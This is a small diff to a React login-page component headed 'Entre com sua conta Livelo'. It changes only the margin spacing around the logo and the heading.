@@ -53,7 +53,7 @@ function App() {
     <div className="App min-h-screen bg-white flex flex-col font-inter">
       <div className="flex-1 flex flex-col items-center pt-16 px-4">
         {/* Logo */}
-        <div className="mb-10">
+        <div className="mb-6">
           <img 
             src="https://customer-assets.emergentagent.com/job_noite-web/artifacts/b119auio_Logo_Livelo_Logo1-removebg-preview.png" 
             alt="Livelo Logo" 
@@ -62,7 +62,7 @@ function App() {
         </div>
 
         {/* Título */}
-        <h2 className="text-xl font-bold text-gray-900 mb-8">
+        <h2 className="text-xl font-bold text-gray-900 mb-6">
           Entre com sua conta Livelo
         </h2>
 
